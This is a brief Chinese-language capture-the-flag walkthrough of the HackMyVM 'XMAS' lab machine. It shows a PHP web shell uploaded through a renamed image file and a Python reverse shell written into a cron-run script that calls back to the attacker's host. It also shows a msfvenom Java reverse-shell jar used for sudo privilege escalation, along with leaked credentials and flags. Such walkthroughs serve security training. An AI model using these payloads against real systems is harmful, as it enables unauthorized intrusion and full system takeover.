# XMAS

2025.03.28 https://hackmyvm.eu/machines/machine.php?vm=XMAS

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

添加 christmas.hmv 到 host

首页上有个上传文件功能，只允许上传图片。先上传 png，bp 进行拦截，修改文件名 3.png.php，添加一句话 shell 到 data 中，上传的文件存储在 uploads 中，进行验证：

```
curl http://christmas.hmv/uploads/3.png.php?1=id --output -
```

数据库连接配置：

```
$mysqli = new mysqli('localhost', 'root', 'ChristmasMustGoOn!', 'christmas');
```

发现脚本 /opt/NiceOrNaughty/nice_or_naughty.py 应该某个定时任务在执行处理 uploads 中的文件，有权限修改，直接反弹 shell：

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > nice_or_naughty.py
```

拿到 user flag：

```
alabaster@xmas:~$ cat user.txt
HMV{7bMJ6js7guhQadYDTmBt}
```

sudo -l 显示 (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar 有 w 权限直接替换，msf 生成 jar：

```
msfvenom -p java/shell_reverse_tcp lhost=192.168.5.3 lport=7777 -f jar -o PublishList.jar
```

将 jar 下载到目标机器覆盖原有，sudo 执行后拿到 root：

```
HMV{GUbM4sBXzvwf7eC9bNL4}
```
